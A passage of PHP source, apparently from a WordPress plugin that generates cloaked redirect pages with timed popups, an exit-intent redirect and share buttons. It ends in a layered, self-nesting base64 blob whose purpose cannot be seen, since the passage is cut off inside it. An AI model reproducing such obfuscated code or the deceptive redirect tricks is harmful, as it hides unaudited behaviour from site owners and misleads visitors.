	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<title>'. $titulo .'</title>
	<meta itemprop="name" content="'. $titulo .'">
	<meta name="twitter:title" content="'. $titulo .'">
	<meta property="og:title" content="'. $titulo .'" />
	<!-- Descricao -->
	<meta itemprop="description" content="'. $descricao . '" />
	<meta name="description" content="'. $descricao .'" />
	<meta name="twitter:description" content="'. $descricao .'" >
	<meta property="og:description" content="'. $descricao .'" >
	<!-- Imagem -->
	<meta itemprop="image" content="'. $imagem .'">
	<meta name="twitter:image" content="'. $imagem .'">
	<meta property="og:image" content="'. $imagem .'" />
	<!-- Twitter -->
	<meta name="twitter:card" content="summary">
	<!-- Open Graph -->
	<meta property="og:type" content="website" />
	<meta property="og:url" content="'. $url_site .'" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0">			
	';
	
	$pagina .= $redir_meta;
	$pagina .= $pixel_facebook;
	$pagina .= $jquery_js;
	$pagina .= '
	
	</head>
	<body>
	<!--HLP '.self::PLUGIN_VERSION.' -->';
	
	$pagina .= $codigo_topo;
	
	$pagina .= '<p>
	<center>';
	if($link["redir_gif"] != 0) $pagina .= '<img src="'. $plugin_url .'/images/loader'.$link["redir_gif"].'.gif">';
	$pagina .= '</center>
	</p>
	<p>
	<center>
	<h2>'.$link['redir_mensagem'].'</h2>
	</center>
	</p>'. $pixel_google .'
	<center>'. $link["redir_codigo"].'</center>
	'. $redir_java.'
	'.$back_redir_code.'
	<input type="hidden" id="back_redir_hidden" value="'.$back_redir_hidden.'">
	</body>
	</html>
	';	
	
	echo $pagina;
	exit;
	
}elseif($link["redirecionamento"] ==1){//Camuflado

	$bonus = '';
	$js    = '';
	$bonus_conteudo = '';
	$css = '';
	$jquery_js = '<script src="'. $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/jquery-1.11.1.js"></script>';
	$jquery_js .= '<script src="'. $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/jquery.mousewheel-3.0.6.pack.js"></script>';
	
	$array_posicoes = array();
	$array_posicoes[0] = "top:1px;left:1px;"; 
	$array_posicoes[1] = "top:1px;right:1px;"; 
	$array_posicoes[2] = "bottom:1px;left:1px;"; 
	$array_posicoes[3] = "bottom:1px;right:1px;"; 
	
	$link["popup_camuflagem"] = trim($link["popup_camuflagem"]);
	$link["url_automatic"] = trim($link["url_automatic"]);
	$link["redirecionar"] = trim($link["redirecionar"]);
	
	$link["url_automatic"] = empty($link["url_automatic"])?$anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'images/bonus2.png':$link["url_automatic"];
	
	

	if(!empty($link["popup_camuflagem"]) && $link["ativar_automatic"] == 1){//PopUp Com temporizador e tudo
		
		$link["popup_camuflagem"] = str_replace("autoplay=1","autoplay=0",$link["popup_camuflagem"]);
		$link["popup_camuflagem"] = str_replace(array('class="mostrarapos',"class='mostrarapos"),array('class="botao mostrarapos',"class='botao mostrarapos"),$link["popup_camuflagem"]);
		
		$bonus .= "<div style='display:none;position:absolute;". $array_posicoes[$link["posicao_imagem_link"]] ."' class='imagem_banner'><a href='#div-popup-camuflagem' class='iframe' name='popup-camuflagem' id='popup-camuflagem'><img src='". $link["url_automatic"] ."'></a></div>";
	
		$js .= '<script src="'. $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/jquery.fancybox.js"></script>';
		$css.= '<link rel="stylesheet" type="text/css" href="'.$anderson_makiyama[self::PLUGIN_ID]->plugin_url  . 'css/jquery.fancybox.css">';
		$css.= '<style>.botao{display:none}</style>';
		
		$abrir_automatic = (int)$link["abrir_automatic"];
		
		$link["segundos_apos_popup"] = $link["segundos_apos_popup"] == 0?0:$link["segundos_apos_popup"] * 1000;
		$link["segundos_apos_banner"] = $link["segundos_apos_banner"] == 0?0:$link["segundos_apos_banner"] * 1000;
		
		$js.= '
		<script type="text/javascript">
			
			is_banner_open = false;
			contador_geral = 0;
			
			function show_button(){
				
				if(!is_banner_open){
					 contador_geral = 0;
					 return;
				}
				
				classe = "mostrarapos" + contador_geral;
				jQuery_1_11_1("."+classe).show();
				
				contador_geral = contador_geral + 10;
				
				my_timer = setTimeout(show_button,10000);
			}

		</script>
		';
		
		if($abrir_automatic ==0){
			$js .='
				<script type="text/javascript">
				jQuery_1_11_1(document).ready(function($){

					  hot_parameters();
					  conteudo = $("#div-popup-camuflagem").html();
					  conteudo2 = conteudo.replace("autoplay=0","autoplay=1");
	
						  setTimeout(function(){
							  $(".imagem_banner").show();
						
						  }, '. $link["segundos_apos_banner"] .');
												  
						  timer_popup = setTimeout(function(){
							  $("#popup-camuflagem").fancybox({
								  \'beforeLoad\': function(){
									$("#div-popup-camuflagem").html(conteudo2);
									is_banner_open = true;
									show_button();
								  },
								  \'afterClose\': function() {
									 $("#div-popup-camuflagem").html(conteudo);
									 is_banner_open = false;
									 clearTimeout(my_timer);
									 contador_geral = 0;
									 
								  }
							  }).trigger(\'click\');
						
						  }, '. $link["segundos_apos_popup"] .');		
						  
						  jQuery_1_11_1("#popup-camuflagem").fancybox({
								\'href\'   : \'#div-popup-camuflagem\',
								\'beforeLoad\': function(){
									clearTimeout(timer_popup);
									$("#div-popup-camuflagem").html(conteudo2);
									is_banner_open = true;
									show_button();
																
								},
								\'afterClose\': function() {
									$("#div-popup-camuflagem").html(conteudo);
									is_banner_open = false;
									clearTimeout(my_timer);
									contador_geral = 0;
								},
								\'helpers\' : {
									overlay : {
										overlayOpacity: 0.5,
										locked: false,
										closeClick: false,
										css : {
											\'background-color\' : \'rgba(100, 149, 237, .5)\'
										}
									}
								}			
						  });
																	  
				});

				</script>
			';
		}else{
			$js .='
				<script type="text/javascript">
				jQuery_1_11_1(document).ready(function($){
					  
					  hot_parameters();
					  
					  conteudo = $("#div-popup-camuflagem").html();
					  conteudo2 = conteudo.replace("autoplay=0","autoplay=1");
						
					  setTimeout(function(){
						  $(".imagem_banner").show();
					
					  }, '. $link["segundos_apos_banner"] .');
																
					  jQuery_1_11_1("#popup-camuflagem").fancybox({
							\'href\'   : \'#div-popup-camuflagem\',
							\'beforeLoad\': function(){
								$("#div-popup-camuflagem").html(conteudo2);
								is_banner_open = true;
								show_button();
															
							},
							\'afterClose\': function() {
								$("#div-popup-camuflagem").html(conteudo);
								is_banner_open = false;
								clearTimeout(my_timer);
								contador_geral = 0;
							},
							\'helpers\' : {
								overlay : {
									overlayOpacity: 0.5,
									locked: false,
									closeClick: false,
									css : {
										\'background-color\' : \'rgba(100, 149, 237, .5)\'
									}
								}
							}			
					  });
								  
				  
				});


				</script>
			';					
		}

		$bonus_real_content = str_replace("></iframe>",' style="width:640px; height:360px;"></iframe>',$link["popup_camuflagem"]);
		$bonus_conteudo .= '<div name="div-popup-camuflagem" style="display:none;" id="div-popup-camuflagem">'. $bonus_real_content .'</div>';

	}elseif($link["ativar_automatic"] == 2){//Link Normal no Banner Fixo

		$abrir_automatic = (int)$link["abrir_automatic"];
		
		$link["segundos_apos_popup"] = $link["segundos_apos_popup"] == 0?0:$link["segundos_apos_popup"] * 1000;
		$link["segundos_apos_banner"] = $link["segundos_apos_banner"] == 0?0:$link["segundos_apos_banner"] * 1000;
		
		$link["link_banner"] = trim($link["link_banner"]);
		
		$bonus .= "<div style='display:none;position:absolute;". $array_posicoes[$link["posicao_imagem_link"]] ."' class='imagem_banner'><a href='". $link["link_banner"] . "' class='iframe' name='popup-camuflagem' id='popup-camuflagem' target='_blank'><img src='". $link["url_automatic"] ."' ></a></div>";

		
		/*if($abrir_automatic ==0){
			$js .='
				<script type="text/javascript">
				jQuery_1_11_1(document).ready(function($){

					  setTimeout(function(){
						  $(".imagem_banner").show();
					
					  }, '. $link["segundos_apos_banner"] .');
											  
					  timer_popup = setTimeout(function(){
						  document.getElementById("popup-camuflagem").click();
					
					  }, '. $link["segundos_apos_popup"] .');
																  
				});
										
				</script>
			';
		}else{*/
			$js .='
				<script type="text/javascript">
				jQuery_1_11_1(document).ready(function($){

				  setTimeout(function(){
					  $(".imagem_banner").show();
				
				  }, '. $link["segundos_apos_banner"] .');
				  
				});

				</script>
			';					
		//}
		
										
	}


	//popover ativo na inteção de sair, verifica se jquery e fancybox foram requisitados
	if($link["ativar_intenc_sair"]!=0){

		//Ainda não foi requisitado o Fancybox, então requisita-o
		if(strpos($js,'jquery.fancybox.js')===false){
			$js .= '<script src="'. $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/jquery.fancybox.js"></script>';
			$css.= '<link rel="stylesheet" type="text/css" href="'.$anderson_makiyama[self::PLUGIN_ID]->plugin_url  . 'css/jquery.fancybox.css">';			
		}
		
		
		$bonus_real_content = str_replace("></iframe>",' style="width:640px; height:360px;"></iframe>', nl2br("$link[pop_intenc_sair]"));
		$bonus_conteudo .= '<div name="div-intenc-sair" style="display:none;" id="div-intenc-sair">'. $bonus_real_content .'</div>';
		
		$js .='
			<script type="text/javascript">
			jQuery_1_11_1(document).ready(function($){
				
				Hot_Intenc_Sair_should_pop = false;
				
				setTimeout(function($){
					document.documentElement.addEventListener(\'mouseleave\', function(e){
						if (e.clientY > 20) { return; }
						Hot_Intenc_Sair($);
					});					
					
				}, 2000,$);


								
				setTimeout(
					function(){
						Hot_Intenc_Sair_should_pop = true;
					},
					1000
				);
				
			  
															  
			});';
         	
			if($link["ativar_intenc_sair"]==1){//Se Não for Apenas Redirect
			
				$js .= 'function Hot_Intenc_Sair($){
					conteudo_intenc_sair = $("#div-intenc-sair").html();
					conteudo_intenc_sair2 = conteudo_intenc_sair.replace("autoplay=0","autoplay=1");
						
					if( ! Hot_Intenc_Sair_should_pop )
						return;
					Hot_Intenc_Sair_should_pop = false;
					window.scrollTo(0,0);
					
					  $.fancybox({
							\'href\'   : \'#div-intenc-sair\',
							\'beforeLoad\': function(){
								$("#div-intenc-sair").html(conteudo_intenc_sair2);
															
							},
							\'afterClose\': function() {
								 $("#div-intenc-sair").html(conteudo_intenc_sair);
							},
							topRatio    : 0,
							\'helpers\' : {
								overlay : {
									overlayOpacity: 0.5,
									locked: false,
									closeClick: false,
									css : {
										\'background-color\' : \'rgba(100, 149, 237, .5)\'
									}
								}
							}			
					  });
									
				}
						
				</script>
			';
			}else{//É APenas Redirect, então muda a Função
			
				$js .= 'function Hot_Intenc_Sair($){
						
					if( ! Hot_Intenc_Sair_should_pop )
						return;
					Hot_Intenc_Sair_should_pop = false;

					
					document.location = "'.$link["url_intenc_sair"].'";
									
				}
						
				</script>
			';				
			}
					
	}
	//----------------
	


	$barra_html='';
	$barra_css='';
	$botao_html = '';
	$link["link_botao"] = trim($link["link_botao"]);
	
		
	//Cria Barra do Topo
	if($link["ativar_barra"] == 1){//Barra ativa
		
		$js .= '<script src="'. $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/jquery.simple.timer.js"></script>';
		
		if(!empty($link["link_botao"]))
			$botao_html = '<a id="hotlinksplus_calltoaction" style="background:#'.$link['cor_botao'].'; display:inline-block; padding:2px 10px 1px; color:#'.$link['cor_texto_botao'].'; text-decoration:none; margin: 0px 20px 0px;border-radius:3px; line-height:28px;" href="'.$link["link_botao"].'" target="_blank"> '.$link["texto_botao"].' </a>';
			
		$barra_html='
<div id="hotlinksplus_topbar" style="position:relative; z-index:99999;  background:#'.$link["cor_barra"].'; padding:4px 20px 3px;"><div id="tpbr_box" style="line-height:40px; text-align:center; width:100%; font-size:15px; font-family: Helvetica, Arial, sans-serif; font-weight:bold;"><span style="color: #'.$link["cor_texto_barra"].'">'.$link["texto_barra"].'</span><div class="timer-pause" data-minutes-left="'.$link['tempo_contador'].'" style="display:inline-block;vertical-align:middle;margin-left:10px;"></div> '.$botao_html.'</div></div>		
		';
		
		$barra_css = '
		<style>
		.days {
		  float: left;
		  margin-right: 4px;
		}
		.hours {
		  float: left;
		  background:#c22a19; display:inline-block; padding:2px 10px 1px; color:white; text-decoration:none; margin: 0px 1px 0px;border-radius:3px; line-height:28px;
		}
		.minutes {
		  float: left;
		  background:#c22a19; display:inline-block; padding:2px 10px 1px; color:white; text-decoration:none; margin: 0px 1px 0px;border-radius:3px; line-height:28px;
		}
		.seconds {
		  float: left;
		  background:#c22a19; display:inline-block; padding:2px 10px 1px; color:white; text-decoration:none; margin: 0px 1px 0px;border-radius:3px; line-height:28px;
		}
		.clearDiv {
		  clear: both;
		}
		
		.timeout {
		  color: red;
		}
		#hotlinksplus_topbar{display:none};
		</style>		
		';
		
		$tempo_barra = $link["tempo_barra"] >0?$link["tempo_barra"]*1000:$link["tempo_barra"];
		$js .= "
		<script>
		function exibe_barra(){
			jQuery_1_11_1('#hotlinksplus_topbar').css('display','block');
		}
		jQuery_1_11_1(document).ready(function($){
			
			setTimeout(exibe_barra,".$tempo_barra.");
			
		});
		</script>
		";
		
		if($link["ativar_contador"]==1) 
			$js .= "
			<script>
			jQuery_1_11_1(document).ready(function($){
			
				$('.timer-quick').startTimer();
			
				$('.timer').startTimer({
				  onComplete: function(){
					//console.log('Complete');
				  }
				});
			
				$('.timer-pause').startTimer({
				  onComplete: function(){
					//console.log('Complete');
				  },
				  allowPause: false
				});
			})
			</script>		
			";
		
	}
		
		
	$js = $jquery_js . $js;

	$share_estilo = '';
	$share_html = '';
	$link_completo_com_host = 'http'.(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS']=='on' ? 's':'').'://' . $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	
	//Cria Botões de Compartilhamento
	if($link["ativar_share"] !=0){
	
		$lado = $link["ativar_share"] == 1?"left":"right";
		
		$share_gif_name = array();
		switch($link["share_gif"]){
		
			case "0":
				$share_gif_name[] = 'facebook';
				$share_gif_name[] = 'twitter';
				$share_gif_name[] = 'google';
				$share_gif_name[] = 'whatsapp';
			break;
			case "1":
				$share_gif_name[] = 'facebook2';
				$share_gif_name[] = 'twitter2';
				$share_gif_name[] = 'google2';	
				$share_gif_name[] = 'whatsapp2';		
			break;
			case "2":
				$share_gif_name[] = 'facebook3';
				$share_gif_name[] = 'twitter3';
				$share_gif_name[] = 'google3';
				$share_gif_name[] = 'whatsapp3';			
			break;	
			
		}
		
		$share_html = "";
		$share_image_size = '';
		
		if($dispositivo != "PC"){

			$share_estilo = '<style>
			#botoessharehotlinksplus{
				position:fixed;
				top:15%;
				'.$lado.':10px;
				float:left;
				border:1px dashed transparent;
				box-shadow: 0px 0px 0px 2px rgba(0,0,0,0.1);
				width:40px;	
				border-radius:5px;
				-moz-border-radius:5px;
				-webkit-border-radius:5px;
				/*background-color:#eff3fa;*/
				padding:0 0 2px 0;
				z-index:999999;
				
			}
			
			#botoessharehotlinksplus .sbutton{
				float:left;clear:both;
				margin:2px 2px 0 2px;
				margin-left:4px;
			}
			#botoessharehotlinksplus .sbutton img{
				width:32px;	
			}
			
			</style>';
					
			$share_html .= "<div id='botoessharehotlinksplus'>";
			$share_html .= "<div class='sbutton' id='gb'>
		<a href='whatsapp://send?text=".$link_completo_com_host."' data-action='share/whatsapp/share' ><img src='".$anderson_makiyama[self::PLUGIN_ID]->plugin_url . "images/".$share_gif_name[3].".png' width='32px'></a>
		</div>";
			
		}else{

			$share_estilo = '<style>
			#botoessharehotlinksplus{
				position:fixed;
				top:20%;
				'.$lado.':10px;
				float:left;
				border:1px dashed transparent;
				box-shadow: 0px 0px 0px 2px rgba(0,0,0,0.1);
				width:100px;	
				border-radius:5px;
				-moz-border-radius:5px;
				-webkit-border-radius:5px;
				/*background-color:#eff3fa;*/
				padding:0 0 2px 0;
				z-index:10;
			}
			
			#botoessharehotlinksplus .sbutton{
				float:left;clear:both;
				margin:5px 5px 0 5px;
				margin-left:16px;
			}
			#botoessharehotlinksplus .sbutton img{
				width:64px;	
			}
			
			</style>';
					
			$share_html .= "<div id='botoessharehotlinksplus'>";
			$share_html .= "<img src='".$anderson_makiyama[self::PLUGIN_ID]->plugin_url."images/compartilhe.png'>";	
		}
		
		$share_html .= "<div class='sbutton' id='gb'>
		<a href='http://www.facebook.com/share.php?u=".$link_completo_com_host."' onclick=\"javascript:window.open(this.href,'', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600');return false;\"><img src='".$anderson_makiyama[self::PLUGIN_ID]->plugin_url . "images/".$share_gif_name[0].".png'></a>
		</div>
		
		<div class='sbutton' id='gb'>
		<a href='http://twitter.com/home?status=".$link_completo_com_host."' onclick=\"javascript:window.open(this.href,'', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600');return false;\"><img src='".$anderson_makiyama[self::PLUGIN_ID]->plugin_url."images/".$share_gif_name[1].".png'></a>
		</div>
		
		<div class='sbutton' id='gb'>
		<a href='https://plus.google.com/share?url=".$link_completo_com_host."' onclick=\"javascript:window.open(this.href,'', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600');return false;\"><img src='".$anderson_makiyama[self::PLUGIN_ID]->plugin_url."images/".$share_gif_name[2].".png'></a>
		</div>
		
		
		</div>
		</div>		
		";
		
	}
	
	$modo_turbo_code = '';

	//Código legal aqui
	$fiatlinx_code="JGZpYXRsaW54X2NvZGU9IkpHWnBZWFJzYVc1NFgyTnZaR1U5SWtwSFduQlpXRkp6WVZjMU5GZ3lUblphUjFVNVNXdHdTRmR1UWxwWFJrcDZXVlpqTVU1R1ozbFVibHBoVWpGVk5WTlhkSGRUUm1SMVVXeHdXRkpyY0RaWFZscHFUVlUxUjFvemJGVmliSEJvVldwR1ZrNVdUbGhrU0dSVVVtMVNNVlZYZUhkWFJrcHlZMFJhV0Zac2NIRlVWbFV4VWpGdmVtSkdWbWxpU0VKdlZsZHdSMVpyTlZkVWJHaHJVMGRTVlZacVFYaE9WbXh5VjI1T1YxSnJiRFZXUjNCUFZqRkplbEZyYUZWaE1WVjRWVzF6TVZadFJrZFdiV3hYVmtaYU5sWnNaREJaVmsxNVZXdGtZVkpXY0c5VmJuQlhWREZXYzFWclpHeFdiRm93VkZaVk5XRldTbkpqUldoV1RXcFdTRll3V2t0WFIwWkpWbXhXVjJKR1dUQldSM2hoVkRKT1dGTnJaR2hTTTJoWVZqQldTMlZHV1hsbFJtUldUVmRTZVZSc1ZtOVdNa1Y1WlVaa1dtSkdWWGhaZWtaWFkyeGtkVlJyT1ZOaWEwcGFWMnhXVTFVeFVYaFRiRlpYVmtWd1dGUlhjRWRWUm14eVYydDBWRkpzU25oV1YzaHZWVEZaZVdGRVJsZFNiRXBEV2xWa1UxTkdTbkpoUlRWWFYwVktkMVpYZEZkU2F6RlhWbGhvV2sweVVsQldiVEV3VGxaYWRHUkdaRmhoZWtJMVZsZDRkMVpyTVVoVmJrWmhWak5vVkZreWVIZFRWbEp6WTBVMWFWSnVRa2hXYlhCS1pESldSMXBHWkZWaE1taGhWRlJLTkZkV2JISlhibHBPVW14S2VWWnNVa2RVTWtwSFUycENWMDF1YUhwV2ExcEtaVlpTY1Zac1pFNWliRXB2VmtkMFZrMVdTbkpPVm14VFlrWndXRlJYTlc5VmJHUnpWMjFHVkdGNlFqUldSM2h2WWtaS1IxTnNRbFppUmtwWVZXMTRhMk5zY0VaUFYyeFRZVE5DU1ZaVVNURlNNVmw0VTJ0YVZHRXphRmxXYTFaM1YwWldjMWRzWkZoV01GcElWbTE0VDJGSFZuSlhhazVYVFdwRk1GZFdaRmRrUmtwellVWldhRTFzU25wV1YzUmhVekZXUjJOR2FFNVdlbXh4VlcweFUxSXhiRlpaZWtaVllYcEdSbFp0ZUc5WlZscFhVMnhTVjFKRmNFeFdiVEZQVTBkT1NGSnNaRmRoTTBJMFZqSjRhbVZHVFhoVFdHeFhZVEZhVjFsWWNITmpNV3h5VjIxR2EwMVdiRE5XTW5oTFlUQXhjbGRzYUZwV1ZscDZWMVprVjJOdFRrZFJiR1JwVmtaYU1WWkdWbUZWTWxKWVZHdG9VRlp1UWs5WmExcDNVakZhY1ZKc1RsZE5WMUl3VlRKMGMxbFhWbkpUYkZwYVlrZG9SRnBYZUd0V1ZrNXpXa1pPVjJKWVVUSlhWM1JoWXpGU2RGSnVTbGhpYTFwWldXdGFZVlpHWkZkYVJYUlhUV3RhUjFsclpFZGlSMFY2VVd4R1YxWjZWak5aZWtwSFl6Sk9SMWRzV21sU01VcDNWbTF3UjFNeFRrZGpSbHBXWWtVMVZsUlhlR0ZsYkZsNVRWaGtXbFpzY0ZoVk1qVkhXVlphYzJOSWNGcGxhM0JZVld4YVYyTnJPVmhpUm1ScFYwZG5lbFp0ZEZOVU1rMTRWbGhrVDFOSFVuQlZNRlozWVVaV2NWRlVSbXBOVmxwNVZqSjBNR0ZzV25OalJWcFdZbGhDVkZaRVJrdFdWbHB5VjJ4YVRtRnJXbEZYVjNSaFV6RkplRk51UmxaaVIyaFVWbXBLYjAxV1drZFdiVVpxWWxaYVNWWnRkRmRXYlVZMllrWm9WbUpHU2toYVJFWnJaRWRXU0ZKdGVHbFdWbkJaVjFaV1YyTXhiRmhXYmtwUFZtdEtZVmxzYUU1bFJsSllaVWhLYkZZeFdrWldWM00xVlRGYVIxZHFVbGROYmxKeVZrUktTMUl4VG5KaFJsWllVMFZLV2xaWGVHdGlNbEpYVld4b2FtVnJXbGhWYlhNeFRVWmFXR1ZGWkZkaGVrWktWVmMxUjFkSFNrZFhiRkpZVm0xU1RGWXdXbE5qYkhCSVpVWk9VMkV6UWxKV01uaHJUa1pOZVZWWWFHRlNWbkJ2Vlc1d1YxUXhiSEpoUlU1c1lraENWMVpYZUU5V1ZURnlZMFpvVjAxdVFtaFdNRnBMVjBkR1NWWnNWbGRpU0VGNlYydFdWbVZHWkVoVmExcHFVakpvY0ZsWWNGZE9WbHB4VTJwQ2FFMXJiRFZXVjNSdlZUSktTR0ZHYkZwaVIyaFVXVEJhYzJSSFVraFNhelZUWWxaS1lWZFhjRTloTWtaSFYyNVNhRkpZUWxsWmJUVkRWRVprVjFwRmRGUldia0V5VlZkNFYyRlhTbkpUYTFaWFRWWktURlpxUmt0V01rcEZWMnhLYVZJemFGWldWM0JMVkRBMVYxZHJWbE5pVlZwUVZXeFNWMUl4VW5OaFJrNVlVakJ3VjFSc2FFOVdiVVY0WTBST1dtVnJXbnBVYlhoTFZsWmFjMk5GTldsU2JrSklWbTF3U21WRk1VZGlSbVJUVjBkU2IxcFhjekZXVm14VlUyMDVUMkpIZUZoV01qQTFWa1phZFZGVVNsWldNMDB4VmtkNGExTkdhM3BhUm1SVFRURktlVlpyVWtkamJWWlhWMjVLVjJKR2NIQldhMVpoV1ZaYVZWRnRkR2hpVmtZMFZsZDRiMkpHU2tkVGJFSldZa1pLV0ZWdGVGZGtSVEZXVDFkc1UyRXpRa2xXVkVreFVqRlplRnBGYUd4U1dHaFdWRlphZDJOc1VuTlhhemxyVW14S01GcFZXazlWTWtwWlZHcE9WMkZyU2xoWmFrcExZMnN4V1ZOck9WaFNhM0JYVjFkNFZrMVhUWGhXYmtwWVltdHdjMVp0TVZOU01XeFdXWHBHVldKVmNFbGFWVkpIVm14YU5sSnNRbHBoTVhCTVZXcEtUMU5XVW5OVmJHUk9UV3hHTmxaclVrZFdNazE1Vld0YVVGWnRhRlpaYkdodlZrWldjVkZVUW14aVIxSjVWbTB4TUdGck1WaGtSRlpYWWxoU1dGWXdaRXRXVmtwMVVXeHdhVmRGTVRSWFZtUTBaREZhYzFadVRtRlNNbmhZV1d4a2IxTXhXWGxPV0dSVVRWZDRXRlV5TlZkWlYxWnlVMnhhV21KSGFFUldWRVp6VmpGYVZWWnJPVmRpUm05M1ZrZDRhMUl4VW5SVGJsSm9Va1UxV1ZadGVHRmpiRlp4VTJ0MFZGSnNXbnBaYTFwUFZqRkplbUZGZUZoV00yaG9WMVprUjJNeVRrZFhiRnBwVjBWS1VWWlhNSGhpTVU1eldraFdhbEpZVWxkVmJYaDNUVlprZFdORlRsZFdNSEJhVlZkME5GZHJNVWRqU0ZwV1RWWndNMVJ0ZUZOamF6VllZa1pPVTAweVVYcFdiWEJEVmpKSmVWTnVTazVYUlRWeFZUQmFTMVl4YkhOV1ZFWnFUVlphZVZZeU5XdGhNVXAwVld0a1dsWlhUWGhXUjNoaFpGWkdkV05IUmxkV2EzQlZWbXRTUzFZeVRYaFVibEpxVWpCYVdGWnRkSGRsUmxwSFYyMUdhVTFWTlZoWk1GSmhWbGRHTmxadVFsWk5SMUp4V2tSR1lWTkZNVmxhUmxKT1ZqTlJNVlp0TVRCV01XUklVMnhXVTJFelVtRldibkJYVlVacmVXVklaRmhXTUhCSFdrVmFVMVV5U2taalJXeFlZa1phVkZaVVJsSmxSazVaWVVkd1UxWnJjRmhXYlRFMFYyc3hSMXBHVmxSaVIxSlVWbTE0ZDFkc2EzZFdibVJvVmpCYWVWWXlOVU5XYXpGWVZWUkNWV0V4VlhoVmJYTXhWMVpLYzFwSGJGZFdSbG8yVm14a01HRXhVWGROU0doaFVsWndiMVZ1Y0ZkVU1WSldWV3hrV0ZKdVFsZFdWM2hQVmxVeGMxZHVjRlpOYWtZelYxWmFZVll4VG5WU2JVWlhWbTVDTWxaVVJtRmtNRFZ6Vkc1S1VGWnJOWEJaYkdSUFRURmFjbGt6YUd0TlZURTFWa2QwWVdGV1RrWk9WVGxXWVRKUk1GVjZSbk5qYlVaSVRsVTFVMkpGYjNkV1JscHJVakZrY2sxWVRsaGhNWEJaVm10Vk1XTnNiRlZTYTNSclZtNUJNbFZYZUZkaFZtUkdVMnBhV0dFeVRqUlZla3BPWlZaYWNsWnNXbWhsYlhoNlYxWm9kMVl5VGxkYVNFNVhZa1UxV0ZSWGRIZFhWbFY1WlVkMGFWSnJjRWhWTW5oRFYyeFplbUZGYUZwTlJuQlRXbGN4UzFJeFVuSlBWVFZVVWxWd1RGWXhhSGRUTWsxNFdrWmtWV0V5YUdGVVZFcFRWbXhzV0dSRmNFNVNiSEJYVmpJd05WWkdXblZSVkVwV1ZqTk5lRmxWVlhoU01rNUdUMVprVGxKc2NESlhWekY2WlVaYWNrMVdWbGRpUmtwdldXeG9iMWRzWkhOWGJHUnJUV3RhZWxrd1dtRldiVXBKVVdzNVYySlVSblpWTW5oclpGZE9SazlXVm1sU1dFRjRWakkxZDFFeFdsaFRibFpTWWtkb1dWWnJWbmRYUmxaelYyNU9UMkpGV25wWmExcFRWVEF4Y2s1RVNsZGhNWEJvVjFaVk1WSnJOVlpYYXpsWVVsWndXRmRYZUZaTlYwMTRWbTVLV0dKck5WQldiVEUwVjBaYVNHUkVRbHBXYTJ3MFdUQmFZVlpXV25SVVdHaFlWbXh3Y2xWcVJrOWtSVEZYWTBkb2FHVnNXa1pXYTFwWFlURkplRnBGV2xCV2JYaFlXVlJPYjFVeFVsWmhSVTVxVm0xU2VsWnRlRTlXYlVwWFYydHNWazFxVmxSV2JURkxWbXMxV1ZSc1dtaE5XRUkxVjJ4V1lXTnRWbFpPVmxwUVZqTlNjRlZxU205VE1WbDVUbGhrVkUxWGVGaFdNalZIWVZaSmVsRnRhRmRpUm5CTVZtdGFjMVpXU25WVWJHUk9Za1p3UjFac1pIcE9WMFpYVjJ4c1VtSnJXbGxaYTFwaFZrWlplV042UmxkTmExcEhXV3RrUjJKSFJqWldiRXBYWWxoQ1JGZFdaRWRqTWs1SFYyeGFhVlpXY0haV1JscHJZakZPYzFwSVZtcFNXRkpXV1d0YWQwMVdaSFZqUlU1WFZqQndTVlpYTVc5V01VbzJVbXQwWVZac2NGaGFSbHByWXpKS1IxVnNUazVoZWxGM1ZtMXdTbVZGTlVaT1ZWcFBWbFp3VUZadGVHRldNV3h6VmxSR2FrMVdXbmxYYTFVeFlrWktkR1JFVmxWV2JGbDNXVlJLUzFOSFJrWmpSbWhwWW10S1NWWXhXbXRUTVZwWVUydFdWV0pIYUZSV2FrcHZUVlphUjFWclNrNVdhelZKVlRKMGIxWlhTbGxoUmxKV1lsUldSRlJWV2xwa01WcDBUMWRzYUdWcldqWlhWRUpoWVRKS1IxTnJaRlJpUlVwb1ZtcE9UMDVHYTNkWGF6VnNVbXhhTVZrd1pHOVViVXBIWVROb1YySkhVak5aVkVaUFpFWk9jbUpIUm14aE1IQlhWMVpTUjFNeVRuTmFSbFpVWWtkU1ZGWnRlR0ZOUm10M1YyNU9WMUpyYkRWV1IzQlBWakF4Y1ZKVVFsVmhNVlY0Vlcxek1WWnNXbk5WYld4WFZrWmFObFpzWkRCWlZrbDNUbFZrV0dFeGNGbFpWM2hMVlVaV2MxVnNaRmRpUm5CSVYydG9UMkZXV25OalJFWlhVbnBXUkZZd1drdFhSMFpKVm14V1YxSlZWalJYV0hCTFZqRktWMVp1U2xCV00yaHZXbGQ0WVdWR1dYbGxSbVJXVFZkNFdWVXllRzlXVjBwelUyMW9WbUV4VlhoV01uaFdaREZ3U0dOSGVGZGlSWEEyVm10a01FMUdiRmRUV0docVVtMW9ZVnBYZEhkbGJGbDRWMnM1VkZKdGREWlphMXBYVmpKS1NFOUlaRmRTTTFKWFZGWlZNV014V25WVmJGWnBWMGRvVlZaWE1IaGxiVlpIV2toS1drMHlhRlJVVjNSaFpXeHNWbFp1VGxwV01WcDVXVEJWTlZZeVNsVldibFpWVmxad1ZGcEZWWGhYUmtwMFVtMXNVMDF0YUV4V2Fra3haREZOZUZWdVNrNVdiWGhvV2xkMFMxWnNiSE5WYTJSb1VtMTRWbFZ0TURWV1JscDFVVlJLVmsxdVRURldiWE40VTFaR2RWTnNaRmRXYmtJeVZteFNTMVl4WkVkVGJrNW9VbFJXVkZwWE1UUlVWbHBWVVcwNVZVMXJOWHBYYTJoTFdWWktObUpJU2xaaGEwcG9WakZhV21WVk1WVlJiV2hYVFVoQ05WWnFTbmRSTVdSSFYydGFUbFpHU2xsV2FrNVRaV3hzTmxOc1pGTldiRnA1VkRGa2IyRkZNVmhrTTNCWFlXdEtXRmxxU2t0amF6RlpVMnhDVjJKWWFGcFhWM2